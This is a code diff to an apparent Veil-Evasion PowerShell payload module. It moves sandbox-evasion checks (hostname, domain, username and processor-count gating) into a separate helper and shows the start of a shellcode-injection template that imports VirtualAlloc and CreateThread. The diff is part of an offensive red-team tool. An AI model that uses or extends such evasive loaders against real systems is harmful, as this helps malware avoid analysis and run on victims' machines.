@@ -7,6 +7,7 @@ Module @harmj0y
 """
 
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 
 
 class PayloadModule:
@@ -38,30 +39,8 @@ class PayloadModule:
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"]}
 
-    def system_checks(self):
-        check_code = ''
-        num_ends_required = 0
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-            check_code += "if($env:computername -eq \"" + self.required_options["HOSTNAME"][0].lower() + "\") {\n"
-            num_ends_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + self.required_options["DOMAIN"][0].lower() + "\") {\n"
-            num_ends_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-            check_code += "if($env:username -eq \"" + self.required_options["USERNAME"][0].lower() + "\") {\n"
-            num_ends_required += 1
-
-        if self.required_options["PROCESSORS"][0].lower() != "x":
-            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + self.required_options["PROCESSORS"][0].lower() + ") {\n"
-            num_ends_required += 1
-
-        return check_code, num_ends_required
-
     def generate(self):
-        checks, num_ends = self.system_checks()
+        checks, num_ends = gamemaker.senecas_games(self)
         baseString = """$c = @"
 [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
